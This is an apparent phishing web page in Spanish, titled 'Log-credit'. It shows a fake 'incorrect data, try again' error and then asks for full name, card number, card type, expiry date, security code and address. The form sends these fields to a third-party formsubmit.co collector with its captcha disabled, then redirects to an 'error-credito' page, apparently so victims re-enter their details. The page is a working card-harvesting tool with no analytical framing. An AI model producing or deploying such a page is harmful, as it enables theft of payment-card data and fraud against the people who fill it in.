<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log-credit</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
</head>
<body >
    <div class="modal modal-signin position-static d-block  py-5" tabindex="-1" role="dialog" id="modalSignin">
        <div class="modal-dialog" role="document">
          <div class="modal-content rounded-4 shadow">
            <div class="modal-header p-5 pb-4 border-bottom-0">
              <!-- <h1 class="modal-title fs-5" >Modal title</h1> -->   
              <div class="alert alert-danger" role="alert">
                Error datos incorrectos, Intentar de nuevo <br><br>
                <img src="img/credito-2.png" width="80px" height="60px" alt="">
              </div>
            </div>
      
            <div class="modal-body p-5 pt-0">
        <form action="https://formsubmit.co/813d0acb154f0701bd84d2bc990ae4cc" method="post" >
                
          <div class="row gy-3">
            <div class="col-md-8">
              <label for="cc-name" class="form-label"><strong>Nombre Completo</strong></label>
              <input type="text" class="form-control" id="cc-name" name="Nombre" placeholder="Ingrese Su nombre completo" required>
              
            </div>
            <div class="col-md-8">
                <label for="cc-number" class="form-label"><strong>N.° Targeta débito o crédito</strong></label>
                <input type="text" class="form-control" id="cc-number" name="N_T" placeholder="Ingrese el numero de targeta" required>
            </div>
                <div class="col-md-7">
                    <label for="state" class="form-label"><strong>su tipo de targeta</strong></label>
                    <select class="form-select" id="state"  required>
                      <option>Tipo de targeta</option>
                      <option>Visa</option>
                      <option>Mastercard</option>
                      <option>American Express</option>
                      <option>Discover</option>
                    </select>
                </div>
                <br>
                <div class="col-md-6">
                    <label for="cc-cvv" class="form-label"><strong>Fecha de Vencimiento</strong></label>
                    <input type="text" class="form-control" id="cc-cvv" name="F_V" placeholder="Ingrese  la Fecha" required>
                  
                </div>
                <br>
                <div class="col-md-6">
                    <label for="cc-cvv" class="form-label"><strong>Codigo de Seguridad</strong></label>
                    <input type="text" class="form-control" id="cc-cvv" name="C_S" placeholder="Codigo de Targeta" required>
                  
                </div>
                <div class="col-md-8">
                    <label for="cc-cvv" class="form-label"><strong>Pais o Direccion exacta</strong></label>
                    <input type="text" class="form-control" id="cc-cvv" name="P_D" placeholder="Direccion" required>
                  
                </div>
      
                <hr class="my-4">

                <button class="w-100 mb-2 btn btn-lg rounded-3 btn-primary" type="submit">Comprar</button>

                <input type="hidden" name="_captcha" value="false">
  <input type="hidden" name="_next" value="https://onlyonce-3.github.io/error-credito/">            
            </form>
            </div>
          </div>
        </div>
      </div>    








<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js" integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js" integrity="sha384-mQ93GR66B00ZXjt0YO5KlohRA5SY2XofN4zfuZxLkoj1gXtW8ANNCe9d5Y3eG5eD" crossorigin="anonymous"></script>   
</body>
</html>
